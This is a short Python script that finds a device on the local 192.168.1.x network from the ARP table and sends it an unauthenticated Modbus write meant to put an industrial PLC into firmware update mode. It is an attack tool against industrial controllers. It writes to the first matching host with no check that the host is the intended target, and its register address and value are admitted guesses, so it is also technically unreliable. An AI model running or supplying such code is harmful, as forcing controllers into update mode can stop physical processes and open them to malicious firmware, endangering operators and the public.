import socket
import subprocess
import pymodbus
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Use ARP scan to find devices on the network
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'dynamic' in line:
            ip = line.split()[0]
            # Check if the IP is in the expected range (e.g., 192.168.1.x)
            if ip.startswith('192.168.1.'):
                return ip
    return None

# Function to activate firmware update mode on the PLC
def activate_firmware_update_mode(plc_ip):
    try:
        client = ModbusTcpClient(plc_ip)
        if client.connect():
            # Assuming the firmware update mode is controlled by a specific register
            # For example, register 0x0001, value 0x01 to activate update mode
            result = client.write_register(0x0001, 0x01)
            if result.isError():
                print(f"Failed to activate firmware update mode on {plc_ip}")
            else:
                print(f"Firmware update mode activated on {plc_ip}")
        else:
            print(f"Failed to connect to PLC at {plc_ip}")
    finally:
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Activate firmware update mode
        activate_firmware_update_mode(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()